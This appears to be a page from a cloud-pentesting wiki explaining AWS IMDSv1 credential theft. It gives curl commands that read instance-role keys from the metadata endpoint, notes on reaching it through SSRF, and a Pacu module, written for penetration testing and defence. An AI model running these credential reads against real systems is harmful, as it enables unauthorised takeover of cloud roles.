---
title: "IMDSv1: unauthenticated credential reads from the metadata endpoint"
description: "Reading role credentials from the unauthenticated IMDSv1 endpoint, often reachable through an SSRF or a foothold on the instance."
keywords:
  - IMDSv1
  - instance role
  - 169.254.169.254
  - SSRF
  - credentials
---

# IMDSv1

IMDSv1 answers a plain `GET` with no token, no header, no authentication. Any request that reaches `169.254.169.254` from the instance gets the role's credentials back, which is why IMDSv1 plus an [SSRF](ssrf.md) is the classic cloud credential theft.

## Reading the role credentials

```bash
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
# -> AccessKeyId / SecretAccessKey / Token / Expiration
```

Export the three values (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`) and you are now the instance role.

## Exploitation notes

- The credentials are temporary; re-read before expiry to refresh.
- IMDSv1 is a simple GET, so it is reachable through SSRF primitives that cannot set request headers, unlike [IMDSv2](imdsv2.md).
- The same role is reachable from a passed [EC2 instance](../../identity/privilege-escalation/pass-role/ec2.md) you launched yourself.

## Tools

- **curl** on the instance, or any request primitive that reaches the link-local address.
- **Pacu** (`ec2__metadata`): automated retrieval from a shell.

## References

- [AWS: instance metadata and user data](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [HackTricks Cloud: IMDSv1](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
- [Stratus Red Team: AWS techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
